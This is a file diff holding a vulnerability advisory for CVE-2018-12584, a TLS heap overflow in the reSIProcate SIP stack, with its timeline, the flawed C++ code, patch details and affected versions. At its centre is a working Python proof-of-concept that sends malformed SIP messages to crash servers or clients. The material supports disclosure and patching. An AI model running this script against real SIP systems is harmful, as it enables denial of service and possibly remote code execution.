@@ -1,0 +1,206 @@
+'''
+CVE ID: CVE-2018-12584
+
+TIMELINE
+
+    Bug report with test code sent to main reSIProcate developers: 2018-06-15
+    Patch created by Scott Godin: 2018-06-18
+    CVE ID assigned: 2018-06-19
+    Patch committed to reSIProcate repository: 2018-06-21
+    Advisory first published on website: 2018-06-22
+    Advisory sent to Bugtraq mailing list: 2018-08-08
+
+DESCRIPTION
+
+A heap overflow can be triggered in the reSIProcate SIP stack when TLS is
+enabled.
+Abuse of this vulnerability may cause a denial of service of software using
+reSIProcate and may also lead to remote code execution.
+No SIP user authentication is required to trigger the vulnerability on the
+client or server side.
+
+TECHNICAL DETAILS
+
+The file resiprocate/resip/stack/ConnectionBase.cxx contained the following
+code fragment:
+
+bool
+ConnectionBase::preparseNewBytes(int bytesRead)
+{
+/* ... */
+         else if (mBufferPos == mBufferSize)
+         {
+            // .bwc. We've filled our buffer; go ahead and make more room.
+            size_t newSize = resipMin(mBufferSize*3/2, contentLength);
+            char* newBuffer = 0;
+            try
+            {
+               newBuffer=new char[newSize];
+            }
+            catch(std::bad_alloc&)
+            {
+               ErrLog(>>"Failed to alloc a buffer while receiving body!");
+               return false;
+            }
+            memcpy(newBuffer, mBuffer, mBufferSize);
+            mBufferSize=newSize;
+            delete [] mBuffer;
+            mBuffer = newBuffer;
+         }
+/* ... */
+}
+
+Execution of the code above could be triggered by sending a partial SIP
+message over TLS with a Content-Length header field, followed by sending a
+packet over TLS with its associated SIP message body. By setting the
+Content-Length field to a value that is lower than the length of the SIP
+message body which followed, a malicious user could trigger a heap buffer
+overflow.
+
+The bug did not appear to be reproducible using TCP instead of TLS even when
+the TCP packets were sent with delays between them.
+
+TEST CODE
+
+The following Python script can be used to test the vulnerability of both
+server and client software based on reSIProcate.
+'''
+
+#!/usr/bin/python3
+
+# reSIProcate through 1.10.2 SIP over TLS heap overflow bug test code
+# Written by Joachim De Zutter (2018)
+
+from socket import *
+from ssl import * # pip install pyopenssl
+
+daemon_mode = False
+
+# server to test (in case daemon_mode = False)
+server = ""
+port = 5061
+
+# server configuration (in case daemon_mode = True)
+server_ip = "xxx.xxx.xxx.xxx"
+keyfile = "keyfile.pem"
+certfile =  "certfile.pem"
+
+username = "test"
+via = "192.168.13.37:31337"
+callid = "LtCwMvc2C5tca58a5Ridwg.."
+cseq = 1
+
+def trigger_server_heap_overflow(connection):
+    global username, server, via, cseq
+    print("Triggering heap overflow!")
+    buffer_length = 100
+    register_packet = "REGISTER sip:" + server + " SIP/2.0\x0d\x0aVia:
+SIP/2.0/TCP " + via + "\x0d\x0aContact: <sip:" + username + "@" + via
++ ">\x0d\x0aTo: <sip:" + username + "@" + server +
+";transport=TCP>\x0d\x0aFrom: <sip:" + username + "@" + server +
+">\x0d\x0aCSeq: " + "%d" % cseq + " REGISTER\x0d\x0aExpires:
+600\x0d\x0aContent-Length: %ld" % buffer_length + "\x0d\x0a\x0d\x0a"
+    oversized_packet = buffer_length * "A" + 64 * "B"
+    connection.send(register_packet.encode())
+    cseq = cseq + 1
+    connection.send(oversized_packet.encode())
+
+def trigger_client_heap_overflow(connection):
+    global username, via, callid, cseq
+    print("Triggering heap overflow!")
+    buffer_length = 100
+    content_length_packet = "SIP/2.0 200 OK\x0d\x0aVia: SIP/2.0/TLS
+10.0.2.15:32703;branch=z9hG4bK-524287-1---c04a0ad2231e66ab;rport\x0d\x0aFrom:
+<sip:" + username + "@" + via +
+";transport=TLS>;tag=00649d4d\x0d\x0aTo: <sip:" + username + "@" + via
++ ";transport=TLS>\x0d\x0aCall-ID: " + callid + "\x0d\x0aCSeq: 2
+PUBLISH\x0d\x0aExpires: 600\x0d\x0aContent-Length: %ld" %
+buffer_length + "\x0d\x0aSIP-ETag:
+af6079e42f65e7e2340e92565570e295\x0d\x0a\x0d\x0a"
+    oversized_packet = buffer_length * "A" + 64 * "B"
+    connection.send(content_length_packet.encode())
+    cseq = cseq + 1
+    connection.send(oversized_packet.encode())
+    connection.shutdown(SHUT_RDWR)
+    connection.close()
+
+def test_clients():
+    global server_ip, keyfile, certfile
+    server_socket=socket(AF_INET, SOCK_STREAM)
+    server_socket.bind((server_ip, 5061))
+    server_socket.listen(1)
+    tls_server = wrap_socket(server_socket,
+ssl_version=PROTOCOL_TLSv1, cert_reqs=CERT_NONE, server_side=True,
+keyfile=keyfile, certfile=certfile)
+    print("Server running!")
+    done = False
+    while not done:
+        connection, client_address= tls_server.accept()
+        print("Connection from " + client_address[0] + ":%d" %
+client_address[1])
+        data_in = connection.recv(1024)
+        if not data_in:
+            done = True
+            break
+        message = data_in.decode()
+        if "SUBSCRIBE" in message:
+            print("Client sent SUBSCRIBE request")
+            trigger_client_heap_overflow(connection)
+
+def test_server():
+    global server, port
+    context = create_default_context()
+    context.check_hostname = False
+    context.verify_mode = CERT_NONE
+    tls_client = context.wrap_socket(socket(AF_INET), server_hostname=server)
+    tls_client.connect((server, port))
+    print("Connected!")
+    trigger_server_heap_overflow(tls_client)
+    tls_client.shutdown(SHUT_RDWR)
+    tls_client.close()
+
+def main():
+    global daemon_mode
+    if daemon_mode:
+        test_clients()
+    else:
+        test_server()
+
+if __name__ == "__main__":
+    main()
+
+'''
+EXPLOITABILITY
+
+At http://joachimdezutter.webredirect.org/CVE-2018-12584-exploitability.html
+the exploitability of an affected version of repro on Windows XP Professional
+with Service Pack 3 was examined, it was separated from this text because AVG
+Web Shield considered the text to be a threat. Arbitrary code execution has
+proven to be possible and may be possible on other operating systems and
+software based on affected versions of reSIProcate as well.
+
+SOLUTION
+
+A patch was created by Scott Godin, it was committed to the reSIProcate
+repository at
+
+https://github.com/resiprocate/resiprocate/commit/2cb291191c93c7c4e371e22cb89805a5b31d6608
+
+The following software based on reSIProcate contains a fix for the issue:
+
+3CX Phone System 15.5.13470.6 and higher
+
+For Debian 8 "Jessie", CVE-2018-12584 and CVE-2017-11521 have been fixed in
+resiprocate package version 1:1.9.7-5+deb8u1
+(https://lists.debian.org/debian-lts-announce/2018/07/msg00031.html)
+
+DISCLAIMER
+
+The information in this report is believed to be accurate at the time of
+publishing based on currently available information.
+Use of the information constitutes acceptance for use in an AS IS condition.
+There are no warranties with regard to this information. Neither the author
+nor the publisher accepts any liability for any direct, indirect, or
+consequential loss or damage arising from use of, or reliance on, this
+information.
+'''
